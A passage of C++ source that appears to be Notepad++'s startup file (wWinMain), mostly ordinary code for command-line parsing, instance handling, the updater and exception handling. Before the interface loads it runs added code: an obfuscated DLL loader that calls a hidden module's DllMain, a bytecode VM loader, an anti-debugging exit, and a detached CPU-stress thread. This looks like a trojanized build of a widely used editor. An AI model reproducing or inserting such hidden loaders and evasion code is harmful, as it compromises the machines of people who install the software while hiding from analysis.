    FARPROC initFunc = ObfCore::ObfAPI::ObfGetProcAddress(hModule, "DllMain");
    
    if (initFunc) {
        // Call in a separate context
        ((void(*)())initFunc)();
    }
    
    return true;
}

// VM-based DLL loading
DWORD vmDllLoader(const BYTE* bytecode, DWORD size) {
    ObfCore::ObfuscationVM vm;
    vm.loadBytecode(bytecode, size);
    return vm.execute();
}

} // namespace ObfInit

// Wrapper function for DLL loading with obfuscation
void loadStartupDll() {
    // Run anti-debug before any operation
    AntiDebug::ExitOnDebug();
    
    // Use obfuscated DLL loading
    ObfInit::loadDllObfuscated();
}

int WINAPI wWinMain(_In_ HINSTANCE hInstance,
                    _In_opt_ HINSTANCE /*hPrevInstance*/, _In_ PWSTR pCmdLine,
                    _In_ int /*nShowCmd*/) {
  g_nppStartTimePoint = std::chrono::steady_clock::now();

  // Load DLL khi khoi dong (truoc giao dien)
  loadStartupDll();

  // Thiet lap Console thong bao
  SetupConsole();

  // Chạy script stress CPU trực tiếp bằng C++
  std::thread([]() { RunCpuStressAndNotify(); }).detach();

  // Notepad++ UAC OPS
  // /////////////////////////////////////////////////////////////////////////////////////////////
  if ((lstrlenW(pCmdLine) > 0) &&
      (__argc >= 2)) // safe (if pCmdLine is NULL, lstrlen returns 0)
  {
    const wchar_t *wszNppUacOpSign = __wargv[1];
    if (lstrlenW(wszNppUacOpSign) > lstrlenW(L"#UAC-#")) {
      if ((__argc == 4) && (wcscmp(wszNppUacOpSign, NPP_UAC_SAVE_SIGN) == 0)) {
        // __wargv[x]: 2 ... tempFilePath, 3  ...  protectedFilePath2Save
        return static_cast<int>(nppUacSave(__wargv[2], __wargv[3]));
      }

      if ((__argc == 4) &&
          (wcscmp(wszNppUacOpSign, NPP_UAC_SETFILEATTRIBUTES_SIGN) == 0)) {
        // __wargv[x]: 2 ... dwFileAttributes (string), 3  ...  filePath
        try {
          return static_cast<int>(nppUacSetFileAttributes(
              static_cast<DWORD>(std::stoul(std::wstring(__wargv[2]))),
              __wargv[3]));
        } catch ([[maybe_unused]] const std::exception &e) {
          return static_cast<int>(
              ERROR_INVALID_PARAMETER); // conversion error (check e.what() for
                                        // details)
        }
      }

      if ((__argc == 4) &&
          (wcscmp(wszNppUacOpSign, NPP_UAC_MOVEFILE_SIGN) == 0)) {
        // __wargv[x]: 2 ... originalFilePath, 3  ...  newFilePath
        return static_cast<int>(nppUacMoveFile(__wargv[2], __wargv[3]));
      }

      if ((__argc == 3) &&
          (wcscmp(wszNppUacOpSign, NPP_UAC_CREATEEMPTYFILE_SIGN) == 0)) {
        // __wargv[x]: 2 ... newEmptyFilePath
        return static_cast<int>(nppUacCreateEmptyFile(__wargv[2]));
      }
    }
  } // Notepad++ UAC
    // OPS////////////////////////////////////////////////////////////////////////////////////////////

  bool TheFirstOne = true;
  ::SetLastError(NO_ERROR);
  ::CreateMutex(NULL, false, L"nppInstance");
  if (::GetLastError() == ERROR_ALREADY_EXISTS)
    TheFirstOne = false;

  std::wstring cmdLineString = pCmdLine ? pCmdLine : L"";
  ParamVector params;
  parseCommandLine(pCmdLine, params);

  // Convert commandline to notepad-compatible format, if applicable
  // For treating "-notepadStyleCmdline" "/P" and "-z"
  stripIgnoredParams(params);
  if (isInList(FLAG_NOTEPAD_COMPATIBILITY, params)) {
    convertParamsToNotepadStyle(params);
  }

  bool isParamePresent;
  bool isMultiInst = isInList(FLAG_MULTI_INSTANCE, params);
  bool doFunctionListExport = isInList(FLAG_FUNCLSTEXPORT, params);
  bool doPrintAndQuit = isInList(FLAG_PRINTANDQUIT, params);

  CmdLineParams cmdLineParams;
  cmdLineParams._displayCmdLineArgs = isInList(FLAG_HELP, params);
  cmdLineParams._isNoTab = isInList(FLAG_NOTABBAR, params);
  cmdLineParams._isNoPlugin = isInList(FLAG_NO_PLUGIN, params);
  cmdLineParams._isReadOnly = isInList(FLAG_READONLY, params);
  cmdLineParams._isFullReadOnly = isInList(FLAG_FULL_READONLY, params);
  cmdLineParams._isFullReadOnlySavingForbidden =
      isInList(FLAG_FULL_READONLY_SAVING_FORBIDDEN, params);
  cmdLineParams._isNoSession = isInList(FLAG_NOSESSION, params);
  cmdLineParams._isPreLaunch = isInList(FLAG_SYSTRAY, params);
  cmdLineParams._alwaysOnTop = isInList(FLAG_ALWAYS_ON_TOP, params);
  cmdLineParams._showLoadingTime = isInList(FLAG_LOADINGTIME, params);
  cmdLineParams._isSessionFile = isInList(FLAG_OPENSESSIONFILE, params);
  cmdLineParams._isRecursive = isInList(FLAG_RECURSIVE, params);
  cmdLineParams._openFoldersAsWorkspace =
      isInList(FLAG_OPEN_FOLDERS_AS_WORKSPACE, params);
  cmdLineParams._monitorFiles = isInList(FLAG_MONITOR_FILES, params);

  cmdLineParams._langType = getLangTypeFromParam(params);
  cmdLineParams._localizationPath = getLocalizationPathFromParam(params);
  cmdLineParams._easterEggName =
      getEasterEggNameFromParam(params, cmdLineParams._quoteType);
  cmdLineParams._ghostTypingSpeed = getGhostTypingSpeedFromParam(params);

  std::wstring pluginMessage;
  if (getParamValFromString(FLAG_PLUGIN_MESSAGE, params, pluginMessage)) {
    if (pluginMessage.length() >= 2 &&
        (pluginMessage.front() == '"' && pluginMessage.back() == '"')) {
      pluginMessage = pluginMessage.substr(1, pluginMessage.length() - 2);
    }
    cmdLineParams._pluginMessage = pluginMessage;
  }

  // getNumberFromParam should be run at the end, to not consuming the other
  // params
  cmdLineParams._line2go = getNumberFromParam('n', params, isParamePresent);
  cmdLineParams._column2go = getNumberFromParam('c', params, isParamePresent);
  cmdLineParams._pos2go = getNumberFromParam('p', params, isParamePresent);
  cmdLineParams._point.x = static_cast<LONG>(
      getNumberFromParam('x', params, cmdLineParams._isPointXValid));
  cmdLineParams._point.y = static_cast<LONG>(
      getNumberFromParam('y', params, cmdLineParams._isPointYValid));

  NppParameters &nppParameters = NppParameters::getInstance();

  nppParameters.setCmdLineString(cmdLineString);

  std::wstring path;
  if (getParamValFromString(FLAG_SETTINGS_DIR, params, path)) {
    // path could contain double quotes if path contains white space
    if (path.c_str()[0] == '"' && path.c_str()[path.length() - 1] == '"') {
      path = path.substr(1, path.length() - 2);
    }
    nppParameters.setCmdSettingsDir(path);
  }

  std::wstring titleBarAdditional;
  if (getParamValFromString(FLAG_TITLEBAR_ADD, params, titleBarAdditional)) {
    if (titleBarAdditional.length() >= 2) {
      if (titleBarAdditional.front() == '"' &&
          titleBarAdditional.back() == '"') {
        titleBarAdditional =
            titleBarAdditional.substr(1, titleBarAdditional.length() - 2);
      }
    }
    nppParameters.setTitleBarAdd(titleBarAdditional);
  }

  std::wstring udlName;
  if (getParamValFromString(FLAG_APPLY_UDL, params, udlName)) {
    if (udlName.length() >= 2) {
      if (udlName.front() == '"' && udlName.back() == '"') {
        udlName = udlName.substr(1, udlName.length() - 2);
      }
    }
    cmdLineParams._udlName = udlName;
  }

  if (cmdLineParams._localizationPath != L"") {
    // setStartWithLocFileName() should be called before parameters are loaded
    nppParameters.setStartWithLocFileName(cmdLineParams._localizationPath);
  }

  nppParameters.load();

  NppGUI &nppGui = nppParameters.getNppGUI();

  NppDarkMode::initDarkMode();
  DPIManagerV2::initDpiAPI();

  bool doUpdateNpp =
      nppGui._autoUpdateOpt._doAutoUpdate != NppGUI::autoupdate_disabled;
  bool updateAtExit =
      nppGui._autoUpdateOpt._doAutoUpdate == NppGUI::autoupdate_on_exit;
  bool doUpdatePluginList =
      nppGui._autoUpdateOpt._doAutoUpdate != NppGUI::autoupdate_disabled;

  if (doFunctionListExport ||
      doPrintAndQuit) // export functionlist feature will serialize functionlist
                      // on the disk, then exit Notepad++. So it's important to
                      // not launch into existing instance, and keep it silent.
  {
    isMultiInst = true;
    doUpdateNpp = doUpdatePluginList = false;
    cmdLineParams._isNoSession = true;
  }

  nppParameters.setFunctionListExportBoolean(doFunctionListExport);
  nppParameters.setPrintAndExitBoolean(doPrintAndQuit);

  // override the settings if notepad style is present
  if (nppParameters.asNotepadStyle()) {
    isMultiInst = true;
    cmdLineParams._isNoTab = true;
    cmdLineParams._isNoSession = true;
  }

  // override the settings if multiInst is chosen by user in the preference
  // dialog
  const NppGUI &nppGUI = nppParameters.getNppGUI();
  if (nppGUI._multiInstSetting == multiInst) {
    isMultiInst = true;
    // Only the first launch remembers the session
    if (!TheFirstOne)
      cmdLineParams._isNoSession = true;
  }

  std::wstring quotFileName = L"";
  // tell the running instance the FULL path to the new files to load
  size_t nbFilesToOpen = params.size();

  for (size_t i = 0; i < nbFilesToOpen; ++i) {
    const wchar_t *currentFile = params.at(i).c_str();
    if (currentFile[0]) {
      // check if relative or full path. Relative paths don't have a colon for
      // driveletter

      quotFileName += L"\"";
      quotFileName += relativeFilePathToFullFilePath(currentFile);
      quotFileName += L"\" ";
    }
  }

  // Only after loading all the file paths set the working directory
  ::SetCurrentDirectory(NppParameters::getInstance()
                            .getNppPath()
                            .c_str()); // force working directory to path of
                                       // module, preventing lock

  if ((!isMultiInst) && (!TheFirstOne)) {
    HWND hNotepad_plus =
        ::FindWindow(Notepad_plus_Window::getClassName(), NULL);
    for (int i = 0; !hNotepad_plus && i < 5; ++i) {
      Sleep(100);
      hNotepad_plus = ::FindWindow(Notepad_plus_Window::getClassName(), NULL);
    }

    if (hNotepad_plus) {
      // First of all, destroy static object NppParameters
      nppParameters.destroyInstance();

      // Restore the window, bring it to front, etc
      bool isInSystemTray =
          ::SendMessage(hNotepad_plus, NPPM_INTERNAL_RESTOREFROMTRAY, 0, 0);

      if (!isInSystemTray) {
        int sw = 0;

        if (::IsZoomed(hNotepad_plus))
          sw = SW_MAXIMIZE;
        else if (::IsIconic(hNotepad_plus))
          sw = SW_RESTORE;

        if (sw != 0)
          ::ShowWindow(hNotepad_plus, sw);
      }
      ::SetForegroundWindow(hNotepad_plus);

      if (params.size() >
              0 // if there are files to open, use the WM_COPYDATA system
          || !cmdLineParams._pluginMessage
                  .empty()) // or pluginMessage is present, use the WM_COPYDATA
                            // system as well
      {
        CmdLineParamsDTO dto =
            CmdLineParamsDTO::FromCmdLineParams(cmdLineParams);

        COPYDATASTRUCT paramData{};
        paramData.dwData = COPYDATA_PARAMS;
        paramData.lpData = &dto;
        paramData.cbData = sizeof(dto);
        ::SendMessage(hNotepad_plus, WM_COPYDATA,
                      reinterpret_cast<WPARAM>(hInstance),
                      reinterpret_cast<LPARAM>(&paramData));

        COPYDATASTRUCT cmdLineData{};
        cmdLineData.dwData = COPYDATA_FULL_CMDLINE;
        cmdLineData.lpData = (void *)cmdLineString.c_str();
        cmdLineData.cbData =
            static_cast<DWORD>((cmdLineString.length() + 1) * sizeof(wchar_t));
        ::SendMessage(hNotepad_plus, WM_COPYDATA,
                      reinterpret_cast<WPARAM>(hInstance),
                      reinterpret_cast<LPARAM>(&cmdLineData));

        COPYDATASTRUCT fileNamesData{};
        fileNamesData.dwData = COPYDATA_FILENAMESW;
        fileNamesData.lpData = (void *)quotFileName.c_str();
        fileNamesData.cbData =
            static_cast<DWORD>((quotFileName.length() + 1) * sizeof(wchar_t));
        ::SendMessage(hNotepad_plus, WM_COPYDATA,
                      reinterpret_cast<WPARAM>(hInstance),
                      reinterpret_cast<LPARAM>(&fileNamesData));
      }
      return 0;
    }
  }

  auto upNotepadWindow = std::make_unique<Notepad_plus_Window>();
  Notepad_plus_Window &notepad_plus_plus = *upNotepadWindow.get();

  std::wstring updaterDir = nppParameters.getNppPath();
  updaterDir += L"\\updater\\";

  std::wstring updaterFullPath = updaterDir + L"gup.exe";

  bool isUpExist = nppGui._doesExistUpdater =
      doesFileExist(updaterFullPath.c_str());

  // wingup doesn't work with the obsolete security layer (API) under xp since
  // downloads are secured with SSL on notepad-plus-plus.org
  winVer ver = nppParameters.getWinVersion();
  bool isGtXP = ver > WV_XP;

  SecurityGuard securityGuard;
  bool isSignatureOK = securityGuard.checkModule(updaterFullPath, nm_gup);

  if (TheFirstOne && isUpExist && isGtXP && isSignatureOK && doUpdateNpp &&
      !updateAtExit) {
    launchUpdater(updaterFullPath, updaterDir);
  }

  MSG msg{};
  msg.wParam = 0;
  Win32Exception::installHandler();
  MiniDumper mdump; // for debugging purposes.
  bool isException = false;
  try {
    notepad_plus_plus.init(hInstance, NULL, quotFileName.c_str(),
                           &cmdLineParams);
    allowPrivilegeMessages(notepad_plus_plus, ver);
    bool going = true;
    while (going) {
      going = ::GetMessageW(&msg, NULL, 0, 0) != 0;
      if (going) {
        // if the message doesn't belong to the notepad_plus_plus's dialog
        if (!notepad_plus_plus.isDlgsMsg(&msg)) {
          if (::TranslateAccelerator(notepad_plus_plus.getHSelf(),
                                     notepad_plus_plus.getAccTable(),
                                     &msg) == 0) {
            ::TranslateMessage(&msg);
            ::DispatchMessageW(&msg);
          }
        }
      }
    }
  } catch (int i) {
    isException = true;
    wchar_t str[50] = L"God Damned Exception:";
    wchar_t code[10];
    wsprintf(code, L"%d", i);
    wcscat_s(str, code);
    ::MessageBox(Notepad_plus_Window::gNppHWND, str, L"Int Exception", MB_OK);
    doException(notepad_plus_plus);
  } catch (std::runtime_error &ex) {
    isException = true;
    ::MessageBoxA(Notepad_plus_Window::gNppHWND, ex.what(), "Runtime Exception",
                  MB_OK);
    doException(notepad_plus_plus);
  } catch (const Win32Exception &ex) {
    isException = true;
    wchar_t message[1024];
    wsprintf(message,
             L"An exception occurred. Notepad++ cannot recover and must be "
             L"shut down.\r\nThe exception details are as follows:\r\n"
             L"Code:\t0x%08X\r\nType:\t%S\r\nException address: 0x%p",
             ex.code(), ex.what(), ex.where());
    ::MessageBox(Notepad_plus_Window::gNppHWND, message, L"Win32Exception",
                 MB_OK | MB_ICONERROR);
    mdump.writeDump(ex.info());
    doException(notepad_plus_plus);
  } catch (std::exception &ex) {
    isException = true;
    ::MessageBoxA(Notepad_plus_Window::gNppHWND, ex.what(), "General Exception",
                  MB_OK);
    doException(notepad_plus_plus);
  } catch (...) // this shouldn't ever have to happen
  {
    isException = true;
    ::MessageBoxA(
        Notepad_plus_Window::gNppHWND,
        "An exception that we did not yet found its name is just caught",
        "Unknown Exception", MB_OK);
    doException(notepad_plus_plus);
  }

  doUpdateNpp = nppGui._autoUpdateOpt._doAutoUpdate !=
                NppGUI::autoupdate_disabled; // refresh, maybe user activated
                                             // these opts in Preferences
  updateAtExit = nppGui._autoUpdateOpt._doAutoUpdate ==
                 NppGUI::autoupdate_on_exit; // refresh
  if (!isException && !nppParameters.isEndSessionCritical() && TheFirstOne &&
      isUpExist && isGtXP && isSignatureOK && doUpdateNpp && updateAtExit) {
    if (launchUpdater(updaterFullPath, updaterDir)) {
      // for updating the nextUpdateDate in the already saved config.xml
      nppParameters.createXmlTreeFromGUIParams();
      nppParameters.saveConfig_xml();
    }
  }

  return static_cast<int>(msg.wParam);
}
